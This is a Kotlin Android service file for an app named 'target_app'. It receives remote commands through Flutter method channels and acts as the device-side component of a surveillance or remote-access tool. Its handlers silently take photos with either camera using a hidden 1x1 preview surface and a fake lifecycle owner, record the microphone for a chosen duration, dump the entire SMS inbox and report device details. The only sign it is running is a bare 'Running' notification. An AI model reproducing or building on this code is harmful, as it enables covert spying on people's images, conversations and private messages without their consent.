package com.example.target_app
import android.app.*; import android.content.Context; import android.content.Intent; import android.media.MediaRecorder
import android.os.*; import android.provider.Telephony; import android.view.Surface
import androidx.camera.core.*; import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.lifecycle.Lifecycle; import androidx.lifecycle.LifecycleOwner; import androidx.lifecycle.LifecycleRegistry
import io.flutter.embedding.engine.FlutterEngine; import io.flutter.embedding.engine.dart.DartExecutor
import io.flutter.plugin.common.MethodChannel; import io.flutter.view.FlutterMain
import java.io.File; import java.util.concurrent.*

class TargetService : Service() {
    private lateinit var engine: FlutterEngine
    private val executor: ExecutorService = Executors.newSingleThreadExecutor()
    override fun onCreate() {
        super.onCreate()
        FlutterMain.startInitialization(this); engine = FlutterEngine(this)
        engine.dartExecutor.executeDartEntrypoint(DartExecutor.DartEntrypoint.createDefault())
        MethodChannel(engine.dartExecutor.binaryMessenger, "com.example.target/service").setMethodCallHandler { call, result ->
            if (call.method == "start") { startForegroundService(); result.success(true) } else result.notImplemented()
        }
        MethodChannel(engine.dartExecutor.binaryMessenger, "target_commands").setMethodCallHandler { call, result ->
            when (call.method) {
                "ping" -> result.success("pong")
                "device_info" -> result.success(mapOf("model" to Build.MODEL, "manufacturer" to Build.MANUFACTURER, "os_version" to Build.VERSION.RELEASE, "brand" to Build.BRAND))
                "battery" -> { val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager; result.success(bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)) }
                "captureImage" -> captureImage(call.argument("front") ?: false, result)
                "recordAudio" -> recordAudio(call.argument("duration") ?: 10, result)
                "getSms" -> {
                    val list = mutableListOf<Map<String, String>>()
                    contentResolver.query(Telephony.Sms.Inbox.CONTENT_URI, null, null, null, "date DESC")?.use { cursor ->
                        while (cursor.moveToNext()) list.add(mapOf("address" to (cursor.getString(cursor.getColumnIndexOrThrow("address")) ?: ""), "body" to (cursor.getString(cursor.getColumnIndexOrThrow("body")) ?: ""), "date" to cursor.getLong(cursor.getColumnIndexOrThrow("date")).toString()))
                    }
                    result.success(list)
                }
                else -> result.notImplemented()
            }
        }
    }
    private fun startForegroundService() {
        val channel = NotificationChannel("target", "Target", NotificationManager.IMPORTANCE_LOW)
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        startForeground(1, Notification.Builder(this, "target").setContentTitle("Running").setSmallIcon(android.R.drawable.ic_dialog_info).build())
    }
    private fun captureImage(front: Boolean, result: MethodChannel.Result) {
        ProcessCameraProvider.getInstance(this).addListener({
            try {
                val cp = ProcessCameraProvider.getInstance(this).get()
                val sel = if (front) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA
                val ic = ImageCapture.Builder().build()
                val pv = Preview.Builder().build().also { val t = android.graphics.SurfaceTexture(0); t.setDefaultBufferSize(1,1); it.setSurfaceProvider { Surface(t) } }
                cp.unbindAll(); cp.bindToLifecycle(FakeLifecycleOwner(), sel, pv, ic)
                val file = File(cacheDir, "img_${System.currentTimeMillis()}.jpg")
                ic.takePicture(ImageCapture.OutputFileOptions.Builder(file).build(), executor, object : ImageCapture.OnImageSavedCallback {
                    override fun onImageSaved(output: ImageCapture.OutputFileResults) { result.success(file.absolutePath) }
                    override fun onError(exc: ImageCaptureException) { result.error("CAMERA_FAIL", exc.message, null) }
                })
            } catch (e: Exception) { result.error("CAMERA_FAIL", e.message, null) }
        }, executor)
    }
    private fun recordAudio(durationSec: Int, result: MethodChannel.Result) {
        try {
            val file = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
            val mr = MediaRecorder(this).apply { setAudioSource(MediaRecorder.AudioSource.MIC); setOutputFormat(MediaRecorder.OutputFormat.MPEG_4); setAudioEncoder(MediaRecorder.AudioEncoder.AAC); setOutputFile(file.absolutePath); prepare(); start() }
            Handler(Looper.getMainLooper()).postDelayed({ mr.stop(); mr.release(); result.success(file.absolutePath) }, durationSec * 1000L)
        } catch (e: Exception) { result.error("AUDIO_FAIL", e.message, null) }
    }
    override fun onBind(intent: Intent?): IBinder? = null
    override fun onDestroy() { engine.destroy(); executor.shutdown(); super.onDestroy() }
    inner class FakeLifecycleOwner : LifecycleOwner {
        private val registry = LifecycleRegistry(this)
        init { registry.currentState = Lifecycle.State.CREATED }
        override val lifecycle: Lifecycle get() = registry
    }
}
